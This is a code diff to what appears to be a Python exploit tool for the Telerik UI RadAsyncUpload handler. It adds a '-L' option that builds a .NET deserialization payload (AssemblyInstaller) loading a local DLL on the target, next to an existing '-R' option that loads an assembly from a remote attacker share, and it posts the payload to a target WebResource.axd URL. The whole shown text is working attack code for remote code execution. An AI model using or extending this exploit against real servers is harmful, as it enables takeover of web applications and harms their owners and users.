@@ -359,7 +359,16 @@ def gen_remote_payload(path):
         'System.Configuration.Install.AssemblyInstaller, System.Configuration.Install, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
     ]
 
+def gen_local_payload(path):
+    return [
+        '{"Path":"file:///' + path + '"}', 
+        'System.Configuration.Install.AssemblyInstaller, System.Configuration.Install, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
+    ]
+
 def upload_remote_payload(payload, proxy):
+    print(upload(custom_payload(payload[0], payload[1]), sys.argv[3], proxy))
+
+def upload_local_payload(payload, proxy):
     print(upload(custom_payload(payload[0], payload[1]), sys.argv[3], proxy))
 
 def mode_test_remote_Payload(proxy = False):
@@ -378,6 +387,13 @@ def mode_load_remote_Payload(proxy = False):
 
 def mode_load_remote_Payload_proxy():
     mode_load_remote_Payload(sys.argv[4])
+
+def mode_load_local_Payload(proxy = False):
+    payload = gen_local_payload(sys.argv[2])
+    upload_local_payload(payload, proxy)
+
+def mode_load_local_Payload_proxy():
+    mode_load_local_Payload(sys.argv[4])
 
 def mode_payload():
     # generate a payload based on TempTargetFolder, Version and payload file
@@ -422,6 +438,7 @@ def mode_help():
         #    E.g. Responder/Collaborator
 
 #        "Load remote payload                 -R lhost/share/mixed_mode_assembly.dll url [proxy]\n\n" +
+#        "Load local payload                  -L c:/users/public/documents/mixed_mode_assembly.dll url [proxy]\n\n" +
 
         "Example URL:               http://target/Telerik.Web.UI.WebResource.axd?type=rau\n" +
         "Example Version:           2016.2.504\n" +
@@ -461,7 +478,11 @@ if __name__ == "__main__":
     elif sys.argv[1] == "-R" and len(sys.argv) == 4:
         mode_load_remote_Payload()
     elif sys.argv[1] == "-R" and len(sys.argv) == 5:
-        mode_load_remote_Payload_proxy()              
+        mode_load_remote_Payload_proxy()       
+    elif sys.argv[1] == "-L" and len(sys.argv) == 4:
+        mode_load_local_Payload()
+    elif sys.argv[1] == "-L" and len(sys.argv) == 5:
+        mode_load_local_Payload_proxy()
     elif sys.argv[1] == "-p" and len(sys.argv) == 5:
         mode_payload()
     elif sys.argv[1] == "-P" and len(sys.argv) == 6:
